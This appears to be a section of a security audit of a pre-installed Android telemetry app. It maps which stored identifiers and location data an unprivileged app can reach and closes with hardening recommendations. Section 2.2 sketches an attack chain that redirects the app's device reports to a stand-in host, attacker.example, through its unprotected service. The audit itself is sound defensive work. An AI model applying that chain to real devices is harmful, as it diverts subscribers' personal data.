# Local exposure — what another app can reach

This note answers a narrower question than the rest of the report: **can an ordinary
third-party application, installed with no permissions, read the data this package collects
and stores on the device?** It also covers the second actor that matters on a pre-installed
package: another app signed with the same certificate and sharing the same `sharedUserId`.

Paths are relative to `evidence/decompiled/`.

---

## 1. Where the data lives

| Data | Store | Format | Protection |
|---|---|---|---|
| Full device report (IMEI, IMSI, ICCID, cell, BD09LL coordinates, app inventory, usage, traffic) | `databases/systemhelper.db`, table `dmregister(jsonString)` | plaintext JSON, max 10 rows | app sandbox |
| RF / location samples | `databases/signalhelper.db`, table `signal(jsonString)` | plaintext JSON, max 100 rows | app sandbox |
| Reporting endpoint, intervals, log switch, first-boot marker | `shared_prefs/com_mobiletools_systemhelper_preference.xml` | XML | app sandbox |
| Full report, again | logcat, tags `HistoryDatabaseHelper`, `SignalDatabaseHelper`, `RegisterUtils` | text | log buffer ACL |
| Full report, again | `TestActivity` on screen | UI | screen |

Source: `c/d/a/b/e.java:70` (insert, cap 10), `c/d/a/b/m.java:51` (insert, cap 100),
`c/d/a/b/l.java:24` (preferences), `c/d/a/b/h.java:16` (log gate).

No external storage is used. Exhaustive search for `getExternalFilesDir`,
`getExternalStorageDirectory`, `/sdcard` and `MODE_WORLD_*` across first-party code returns
nothing. `allowBackup=false` closes the ADB-backup path, and `android:debuggable` is absent.

**Conclusion:** the files are not readable by an unprivileged app. The sandbox on Android 9+
(SELinux + per-app UID) is doing its job, and there is no world-readable file, no exported
provider, and no `grantUriPermissions`.

---

## 2. Reachability matrix

Every component below is `android:exported="true"` with **no** `android:permission`
(`evidence/AndroidManifest.xml`).

| Component | Exported | Permission | What an unprivileged app can do |
|---|---|---|---|
| `service.RegisterHelperService` | yes | **none** | bind and call all five AIDL methods |
| `Activity.TestActivity` | yes | **none** | `startActivity` → renders the full identity JSON |
| `control.OnBootReceiver` | yes | **none** | send an explicit broadcast → complete registration cycle |
| `control.SIMStateReceiver` | yes | **none** | send an explicit broadcast → registration cycle |
| `control.ConnectStateReceiver` | yes | **none** | send an explicit broadcast → log line only |
| `ScheduleRegisterReceiver`, `AppInfoRegisterReceiver`, `SignalInfoRegisterReceiver`, `GetSignalInfoReceiver` | no | — | not reachable (alarm targets) |
| `RegisterIntentService`, `RegisterJobService` | no | — | not reachable |

`RegisterHelperService.onBind` returns the binder unconditionally — there is no
`checkCallingPermission`, no `Binder.getCallingUid()` check, no signature comparison
(`com/mobiletools/systemhelper/service/RegisterHelperService.java:63`).

### 2.1 The AIDL surface

`com/mobiletools/systemhelper/service/a.java` — interface
`com.mobiletools.systemhelper.service.IRegisterHelperService`:

| Tx | Method | Effect |
|---|---|---|
| 1 | `a(String)` | `serverAddress` := argument (`c/d/a/b/l.java:93`) |
| 2 | `a(int)` | rewrites all five intervals (`l.e/a/c/b/d/f/g`) |
| 3 | `b()` | deletes the shared-preference file by absolute path (`l.java:161`) |
| 4 | `a(boolean)` | sets `d.f1331a` **and persists** `preference_enable_log` |
| 5 | `a()` | returns the log flag |

There is no getter for IMEI, coordinates, the queue, or any collected field. **The service is
a write-only control plane.**

### 2.2 What the control plane is worth

An app with the `INTERNET` permission (a normal, non-dangerous permission granted at install)
can chain three primitives:

```
bindService(RegisterHelperService)
   ├─ a("http://attacker.example/collect")   // redirect
   ├─ a(true)                                // turn on verbose logging
   └─ a(60)                                  // shorten every interval
sendBroadcast(explicit → OnBootReceiver)     // trigger a report now
```

Result:

1. the next report, including IMEI/IMSI/ICCID/coordinates/app inventory, is POSTed to the
   attacker's host instead of `dm.wo.com.cn`;
2. the same JSON is written to logcat in clear text;
3. collection runs at the attacker's cadence.

**But the attacker still cannot read the payload.** The body is
`AES-128-ECB(json, key = MD5(json))` (`c/d/a/b/c.java:42`, caller `control/e.java:43`), and
`sign = RSA(pub.cer, MD5(json))` with a public key. Possession of the ciphertext does not
yield the plaintext, and the MD5 key cannot be recovered without the plaintext. What the
attacker gains is therefore:

| Property | Gained? |
|---|---|
| Confidentiality of the report | **no** (ciphertext only) |
| Ability to divert/drop the report | yes (integrity / availability) |
| Ability to change collection frequency | yes (privacy amplification) |
| Ability to enable plaintext logging | yes (but reading logcat needs privilege, see §3) |
| Ability to delete pending reports | yes (`b()`) |
| Traffic metadata (timing, size, source IP) | yes |

This is why F-02 is scored on integrity and availability, not confidentiality.

### 2.3 `Activity.TestActivity`

`Activity.TestActivity` is exported and unauthenticated. It renders
`b.a(context,"").a()` — the same JSON — into a `TextView`. An unprivileged app can start it,
but reading pixels requires `MediaProjection`, an accessibility service, or a human. The
realistic abuse is by **accessibility-abusing malware**, which is common in the region, or by
a shoulder-surfing attacker. It is an information-disclosure surface, not a silent read.

---

## 3. Reading logcat

`c/d/a/b/h.java:16` gates all `Log.d/Log.e` calls on `d.f1331a`. When enabled, the complete
report is written:

```
HistoryDatabaseHelper: queryOldestRecord:{"Imei1":"…","Imsi":"…","Iccid":"…",…}
HistoryDatabaseHelper: insertRecord:{"…"}
SignalInfoReceiver: siginfo:{"…","Longitude":"…","Latitude":"…"}
```

Who can read that:

| Actor | Can read? | Note |
|---|---|---|
| Ordinary third-party app | **no** | `READ_LOGS` is `signature\|privileged` since API 16; apps only see their own logs |
| Privileged system app with `READ_LOGS` | yes | pre-installed or platform-signed |
| `adb logcat` / bugreport | yes | requires USB debugging or a debug build of the collector |
| Root | yes | |

So this is a **forensic and privileged-observer leak**, not an unprivileged one. It matters
because the switch is remotely controllable through F-02, which lets any app *cause* the leak
even though it cannot *read* it.

---

## 4. The same-certificate actor: `sharedUserId`

`AndroidManifest.xml`:

```xml
<manifest android:sharedUserId="com.mobiletools.systemhelper.uid" …>
```

Any package that (a) is signed with the same certificate and (b) declares the same
`android:sharedUserId` runs as the **same Linux UID**. It can then:

- read `databases/systemhelper.db` and `signalhelper.db` directly, in plaintext — including
  IMEI, IMSI, ICCID and coordinates;
- modify the preference file, including `serverAddress` and `preference_enable_log`;
- write into the queue, so the agent uploads attacker-chosen records;
- call the AIDL surface without going through Binder permission checks.

On a retail HyperOS image the set of packages able to do this is small — it needs the
platform/carrier signing key, so it is the carrier's own pre-installed apps, not an arbitrary
download. But the trust boundary is now **"any app the carrier ships or updates"**, and a
single vulnerability in any sibling app with that UID exposes this queue.

`sharedUserId` is deprecated since API 29 and has been the root cause of several Android
supply-chain exposures. For a telemetry agent that stores subscriber identifiers in plaintext,
it is the wrong default.

---

## 5. Privilege abuse

`com.mobiletools.systemhelper` holds `READ_PRIVILEGED_PHONE_STATE`, `READ_PRECISE_PHONE_STATE`,
`PACKAGE_USAGE_STATS`, `QUERY_ALL_PACKAGES`, background location and `SCHEDULE_EXACT_ALARM`.

| Question | Answer |
|---|---|
| Can an unprivileged app make it read IMEI/IMSI on demand? | **Yes** — by triggering a registration cycle through the exported receivers or the service |
| Can that app receive the result in clear text? | **No** — the result is encrypted and signed; only the carrier's private key opens it |
| Can it make the app read *more* than intended? | Partly — it can shorten intervals and force cycles, but the schema is fixed |
| Can it escalate its own privileges through this app? | **No** — no exported method returns a privileged value and no file descriptor is passed |
| Can it persist? | **Yes** — `a(boolean)` persists the log flag, `a(String)` persists the endpoint |

So the package is a **confused deputy for collection, not for disclosure**. It will collect
and transmit on behalf of any caller, but it will not hand the caller the data.

---

## 6. What would change this conclusion

| Change | Effect |
|---|---|
| `RegisterHelperService` gains a getter for the queue or the device block | immediate unprivileged PII disclosure |
| A `ContentProvider` is added without a permission | same |
| A file is written under `getExternalFilesDir` | readable by any app with storage access on API < 30 |
| `allowBackup` flipped to `true` | `adb backup` extraction |
| The package starts logging without the flag | logcat leak at default settings |
| Another carrier app with the same `sharedUserId` is compromised | full plaintext queue |

---

## 7. Recommendations

1. `android:exported="false"` on the service, the activity and the three receivers; if a
   vendor component needs them, protect with `com.mobiletools.systemhelper.permission`
   (already declared at `protectionLevel="signature"`, currently unused).
2. Drop `sharedUserId`; if cross-app access is required, use a signature-protected provider
   with an explicit, auditable grant.
3. Encrypt the queue at rest (Android Keystore-wrapped key), or keep it in memory only.
4. Delete `TestActivity` from release builds.
5. Never expose the log switch over IPC; compile out identifier logging in release builds.
